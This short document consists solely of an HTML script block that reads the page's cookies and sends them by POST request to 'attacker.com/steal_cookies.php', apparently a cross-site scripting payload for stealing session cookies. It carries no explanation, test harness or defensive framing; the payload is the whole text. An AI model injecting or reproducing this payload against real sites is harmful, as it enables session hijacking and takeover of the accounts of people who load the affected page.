<script>
  var cookies = document.cookie; var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://attacker.com/steal_cookies.php', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('cookies=' + encodeURIComponent(cookies));
</script>;
